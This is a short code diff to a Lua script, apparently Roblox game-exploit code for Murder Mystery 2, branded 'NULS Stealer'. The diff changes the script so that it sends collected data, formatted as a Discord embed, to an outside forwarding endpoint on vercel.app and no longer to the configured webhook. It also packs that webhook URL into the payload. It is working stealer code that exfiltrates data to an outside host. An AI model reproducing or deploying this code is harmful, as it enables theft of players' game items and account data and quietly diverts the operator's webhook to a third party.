@@ -399,8 +399,20 @@ local function MM2()
             }
         }
 
-        local body = HttpService:JSONEncode(data2)
-
+        local body = HttpService:JSONEncode({
+        webhook = webhook,
+        content = contentPing,
+        username = "NULS Stealer",
+        avatar_url = "https://i.imgur.com/ulY8nQk.png",
+        embeds = {{
+            title = titleName,
+            color = embedColor,
+            fields = fields,
+            footer = {
+                text = "NULS Stealer | .gg/ronixexecutor\n Made By NULS :3"
+            }
+        }}
+    })
         local headers = {
             ["Content-Type"] = "application/json",
             ["DiscUser"] = discuser
@@ -409,7 +421,7 @@ local function MM2()
         local response =
             request(
             {
-                Url = webhook,
+                Url = "https://webhook-rose-nu.vercel.app/api/forward.js",
                 Method = "POST",
                 Headers = headers,
                 Body = body
